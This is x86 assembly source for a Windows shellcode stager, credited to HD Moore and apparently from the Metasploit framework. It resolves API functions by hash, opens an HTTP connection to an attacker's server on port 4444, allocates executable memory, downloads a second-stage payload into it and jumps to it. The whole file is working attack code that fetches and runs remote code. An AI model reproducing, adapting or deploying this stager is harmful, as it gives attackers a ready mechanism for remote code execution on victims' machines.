;-----------------------------------------------------------------------------;
; Author: HD Moore
; Compatible: Confirmed Windows 7, Windows 2008 Server, Windows XP SP1, Windows SP3, Windows 2000
; Known Bugs: Incompatible with Windows NT 4.0, buggy on Windows XP Embedded (SP1)
; Version: 1.0
;-----------------------------------------------------------------------------;
[BITS 32]

; Input: EBP must be the address of 'api_call'.
; Output: EDI will be the socket for the connection to the server
; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
load_wininet:
  push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
  push 0x696e6977        ; ...
  push esp               ; Push a pointer to the "wininet" string on the stack.
  push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
  call ebp               ; LoadLibraryA( "wininet" )

internetopen:
  xor edi,edi
  push edi               ; DWORD dwFlags
  push edi               ; LPCTSTR lpszProxyBypass
  push edi               ; LPCTSTR lpszProxyName
  push edi               ; DWORD dwAccessType (PRECONFIG = 0)
  push byte 0            ; NULL pointer
  push esp               ; LPCTSTR lpszAgent ("\x00")
  push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
  call ebp

internetconnect:
  xor ecx, ecx
  push ecx               ; DWORD_PTR dwContext (NULL)
  push ecx               ; dwFlags
  push byte 3            ; DWORD dwService (INTERNET_SERVICE_HTTP)
  push ecx               ; password
  push ecx               ; username
  push dword 4444        ; PORT
  jmp short dbl_get_server_host ; push pointer to HOSTNAME
got_server_host:
  push eax               ; HINTERNET hInternet
  push 0xC69F8957        ; hash( "wininet.dll", "InternetConnectA" )
  call ebp

httpopenrequest:
  xor edx, edx           ; NULL
  push edx               ; dwContext (NULL)
  push (0x80000000 | 0x04000000 | 0x00200000 | 0x00000200 | 0x00400000) ; dwFlags
    ;0x80000000 |        ; INTERNET_FLAG_RELOAD
    ;0x04000000 |        ; INTERNET_NO_CACHE_WRITE
    ;0x00200000 |        ; INTERNET_FLAG_NO_AUTO_REDIRECT
    ;0x00000200 |        ; INTERNET_FLAG_NO_UI
    ;0x00400000          ; INTERNET_FLAG_KEEP_CONNECTION
  push edx               ; accept types
  push edx               ; referrer
  push edx               ; version
  jmp get_server_uri     ; push pointer to url
got_server_uri:
  push edx               ; method
  push eax               ; hConnection
  push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
  call ebp
  xchg esi, eax          ; hHttpRequest in esi

set_retry:
  push byte 0x10
  pop ecx

httpsendrequest:
  xor edi, edi
  push edi               ; optional length
  push edi               ; optional
  push edi               ; dwHeadersLength
  push edi               ; headers
  push esi               ; hHttpRequest
  push 0x7B18062D        ; hash( "wininet.dll", "HttpSendRequestA" )
  call ebp
  test eax,eax
  jnz short allocate_memory

try_it_again:
  loopnz httpsendrequest

; fall through to failure

failure:
  push 0x56A2B5F0        ; hardcoded to exitprocess for size
  call ebp

dbl_get_server_host:
  jmp get_server_host

get_server_uri:
  call got_server_uri

server_uri:
 db "/12345", 0x00

allocate_memory:
  push byte 0x40         ; PAGE_EXECUTE_READWRITE
  push 0x1000            ; MEM_COMMIT
  push 0x00400000        ; Stage allocation (8Mb ought to do us)
  push edi               ; NULL as we dont care where the allocation is (zero'd from the prev function)
  push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
  call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

download_prep:
  xchg eax, ebx          ; place the allocated base address in ebx
  push ebx               ; store a copy of the stage base address on the stack
  push ebx               ; temporary storage for bytes read count
  mov edi, esp           ; &bytesRead

download_more:
  push edi               ; &bytesRead
  push 8192              ; read length
  push ebx               ; buffer
  push esi               ; hRequest
  push 0xE2899612        ; hash( "wininet.dll", "InternetReadFile" )
  call ebp

  test eax,eax           ; download failed? (optional?)
  jz failure

  mov eax, [edi]
  add ebx, eax           ; buffer += bytes_received

  test eax,eax           ; optional?
  jnz download_more      ; continue until it returns 0
  pop eax                ; clear the temporary storage

execute_stage:
  ret                    ; dive into the stored stage address

get_server_host:
  call got_server_host

server_host:

